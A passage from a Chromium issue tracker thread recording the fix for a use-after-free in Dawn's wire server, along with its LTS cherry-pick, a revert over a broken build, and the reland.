      the server side that should fulfill a reservation that was 
      somehow already Unregistered, the server now fails the callback 
      and reclaims the backing object instead. 
    - In order to properly test this new change, the mock API was 
      updated to allow specifying specific futures when emulating 
      callbacks firing on the server side. A sibling API was added to 
      allow mock expectations to retrieve the server-side Futures to 
      allow fine-grained control of which callbacks to trigger via 
      emulation. This meant that the mock objects now need maps for 
      callbacks per object because we could have multiple identical 
      callback types in flight at once. To avoid polluting other 
      existing test code, the additional Future argument is 
      optional with the assertion that only one callback was in 
      flight. 
     
    Bug: 508092644 
    Fixed: 515275963 
    Change-Id: I6944afc4420c7f345c16796cc692dafa4f2f88cc 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/309135 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/311316 
    Auto-Submit: Kai Ninomiya <kainino@chromium.org> 
    Reviewed-by: Loko Kung <lokokung@google.com>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerBase.h`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `include/dawn/wire/WireServer.h`
- M `src/dawn/tests/unittests/wire/WireSpecificCommandTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/utils/TerribleCommandBuffer.cpp`
- M `src/dawn/utils/TerribleCommandBuffer.h`
- M `src/dawn/wire/WireServer.cpp`
- M `src/dawn/wire/server/ObjectStorage.h`
- M `src/dawn/wire/server/Server.h`
- M `src/dawn/wire/server/ServerAdapter.cpp`
- M `src/dawn/wire/server/ServerDevice.cpp`
- M `src/dawn/wire/server/ServerInstance.cpp`
- M `src/dawn/wire/server/ServerSurface.cpp`

---

Hash: 1815a06195d9c74ac737a96f87c05111926e04f8  

Date: Thu May 28 21:26:01 2026


---

### pe...@google.com (2026-07-15)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-07-15)

1. https://dawn-review.git.corp.google.com/c/dawn/+/323275
2. Medium - There were some conflicts.
3. 148 and 149
4. Yes.

### dx...@google.com (2026-07-17)

Project: dawn  

Branch:  chromium/7559  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/323275>

[M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters.

---


Expand for full commit details
```
[M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters. 
 
- In the bug below, it was found that by injecting UnregisterObject 
  commands that correspond to allocated but not backed objects, i.e. 
  objects that would be returned via asynchronous APIs, it was 
  possible to make the server access freed memory if we tried to 
  run the async API again while reusing the same object ids. This 
  change makes it so that the server tracks both the id and the 
  generation to uniquely identify objects when dealing with a 
  malicious or compromised client. When an async callback fires on 
  the server side that should fulfill a reservation that was 
  somehow already Unregistered, the server now fails the callback 
  and reclaims the backing object instead. 
- In order to properly test this new change, the mock API was 
  updated to allow specifying specific futures when emulating 
  callbacks firing on the server side. A sibling API was added to 
  allow mock expectations to retrieve the server-side Futures to 
  allow fine-grained control of which callbacks to trigger via 
  emulation. This meant that the mock objects now need maps for 
  callbacks per object because we could have multiple identical 
  callback types in flight at once. To avoid polluting other 
  existing test code, the additional Future argument is 
  optional with the assertion that only one callback was in 
  flight. 
 
Bug: 508092644 
Change-Id: I6944afc4420c7f345c16796cc692dafa4f2f88cc 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/309135 
Commit-Queue: Loko Kung <lokokung@google.com> 
Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
(cherry picked from commit 1c5131547e777334e1fbe6de7c669e094ada7678) 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/323275 
Reviewed-by: Loko Kung <lokokung@google.com>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerBase.h`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `include/dawn/wire/WireServer.h`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/utils/TerribleCommandBuffer.cpp`
- M `src/dawn/utils/TerribleCommandBuffer.h`
- M `src/dawn/wire/WireServer.cpp`
- M `src/dawn/wire/server/ObjectStorage.h`
- M `src/dawn/wire/server/Server.h`
- M `src/dawn/wire/server/ServerAdapter.cpp`
- M `src/dawn/wire/server/ServerDevice.cpp`
- M `src/dawn/wire/server/ServerInstance.cpp`
- M `src/dawn/wire/server/ServerSurface.cpp`

---

Hash: 8bc70ddb290c93528e280993e1c88e57792cb45b  

Date: Fri Jul 17 08:26:57 2026


---

### dx...@google.com (2026-07-20)

Project: dawn  

Branch:  chromium/7559  

Author:  Gyuyoung Kim (xWF) [qkim@google.com](mailto:qkim@google.com)  

Link:    <https://dawn-review.googlesource.com/325715>

Revert "[M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters."

---


Expand for full commit details
```
Revert "[M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters." 
 
This reverts commit 8bc70ddb290c93528e280993e1c88e57792cb45b. 
 
Reason for revert: The CL broke the build of the M144 branch. 
 
Failure Link: https://ci.chromium.org/ui/p/chromium-m144/builders/ci/chromeos-amd64-generic-rel/3398/overview 
 
Original change's description: 
> [M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters. 
> 
> - In the bug below, it was found that by injecting UnregisterObject 
>   commands that correspond to allocated but not backed objects, i.e. 
>   objects that would be returned via asynchronous APIs, it was 
>   possible to make the server access freed memory if we tried to 
>   run the async API again while reusing the same object ids. This 
>   change makes it so that the server tracks both the id and the 
>   generation to uniquely identify objects when dealing with a 
>   malicious or compromised client. When an async callback fires on 
>   the server side that should fulfill a reservation that was 
>   somehow already Unregistered, the server now fails the callback 
>   and reclaims the backing object instead. 
> - In order to properly test this new change, the mock API was 
>   updated to allow specifying specific futures when emulating 
>   callbacks firing on the server side. A sibling API was added to 
>   allow mock expectations to retrieve the server-side Futures to 
>   allow fine-grained control of which callbacks to trigger via 
>   emulation. This meant that the mock objects now need maps for 
>   callbacks per object because we could have multiple identical 
>   callback types in flight at once. To avoid polluting other 
>   existing test code, the additional Future argument is 
>   optional with the assertion that only one callback was in 
>   flight. 
> 
> Bug: 508092644 
> Change-Id: I6944afc4420c7f345c16796cc692dafa4f2f88cc 
> Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/309135 
> Commit-Queue: Loko Kung <lokokung@google.com> 
> Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
> (cherry picked from commit 1c5131547e777334e1fbe6de7c669e094ada7678) 
> Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/323275 
> Reviewed-by: Loko Kung <lokokung@google.com> 
 
# Not skipping CQ checks because original CL landed > 1 day ago. 
 
Bug: 508092644 
Change-Id: I4f94b4abff06bc8edd2d5c28a231df5b6f158581 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/325715 
Reviewed-by: Colin Blundell <blundell@chromium.org> 
Reviewed-by: Corentin Wallez <cwallez@chromium.org>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerBase.h`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `include/dawn/wire/WireServer.h`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/utils/TerribleCommandBuffer.cpp`
- M `src/dawn/utils/TerribleCommandBuffer.h`
- M `src/dawn/wire/WireServer.cpp`
- M `src/dawn/wire/server/ObjectStorage.h`
- M `src/dawn/wire/server/Server.h`
- M `src/dawn/wire/server/ServerAdapter.cpp`
- M `src/dawn/wire/server/ServerDevice.cpp`
- M `src/dawn/wire/server/ServerInstance.cpp`
- M `src/dawn/wire/server/ServerSurface.cpp`

---

Hash: 0ca897281811effd6e73c4b73c4579da766e863f  

Date: Mon Jul 20 10:46:46 2026


---

### qk...@google.com (2026-07-22)

> 1. https://dawn-review.git.corp.google.com/c/dawn/+/323275
> 2. Medium - There were some conflicts.
> 3. 148 and 149
> 4. Yes.

The cherry-picked CL needs to have https://dawn-review.git.corp.google.com/c/dawn/+/326475 to use DAWN_UNSAFE_BUFFERS macro. 

### dx...@google.com (2026-07-23)

Project: dawn  

Branch:  chromium/7559  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/326455>

Reland "[M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters."

---


Expand for full commit details
```
Reland "[M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters." 
 
This is a reland of commit 8bc70ddb290c93528e280993e1c88e57792cb45b 
 
Original change's description: 
> [M144-LTS][wire] Fixes potential UAF when dealing with injected Unregisters. 
> 
> - In the bug below, it was found that by injecting UnregisterObject 
>   commands that correspond to allocated but not backed objects, i.e. 
>   objects that would be returned via asynchronous APIs, it was 
>   possible to make the server access freed memory if we tried to 
>   run the async API again while reusing the same object ids. This 
>   change makes it so that the server tracks both the id and the 
>   generation to uniquely identify objects when dealing with a 
>   malicious or compromised client. When an async callback fires on 
>   the server side that should fulfill a reservation that was 
>   somehow already Unregistered, the server now fails the callback 
>   and reclaims the backing object instead. 
> - In order to properly test this new change, the mock API was 
>   updated to allow specifying specific futures when emulating 
>   callbacks firing on the server side. A sibling API was added to 
>   allow mock expectations to retrieve the server-side Futures to 
>   allow fine-grained control of which callbacks to trigger via 
>   emulation. This meant that the mock objects now need maps for 
>   callbacks per object because we could have multiple identical 
>   callback types in flight at once. To avoid polluting other 
>   existing test code, the additional Future argument is 
>   optional with the assertion that only one callback was in 
>   flight. 
> 
> Bug: 508092644 
> Change-Id: I6944afc4420c7f345c16796cc692dafa4f2f88cc 
> Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/309135 
> Commit-Queue: Loko Kung <lokokung@google.com> 
> Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
> (cherry picked from commit 1c5131547e777334e1fbe6de7c669e094ada7678) 
> Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/323275 
> Reviewed-by: Loko Kung <lokokung@google.com> 
 
Bug: 508092644 
Change-Id: If36a104b3faf0658388cb5ae66b24d9126ed3a7f 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/326455 
Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
Reviewed-by: Loko Kung <lokokung@google.com>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerBase.h`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `include/dawn/wire/WireServer.h`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/utils/TerribleCommandBuffer.cpp`
- M `src/dawn/utils/TerribleCommandBuffer.h`
- M `src/dawn/wire/WireServer.cpp`
- M `src/dawn/wire/server/ObjectStorage.h`
- M `src/dawn/wire/server/Server.h`
- M `src/dawn/wire/server/ServerAdapter.cpp`
- M `src/dawn/wire/server/ServerDevice.cpp`
- M `src/dawn/wire/server/ServerInstance.cpp`
- M `src/dawn/wire/server/ServerSurface.cpp`

---

Hash: d98d9ca2cb80995c50998effd9f7fc01bd240350  

Date: Thu Jul 23 06:30:31 2026


---

### ch...@google.com (2026-08-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/508092644)*
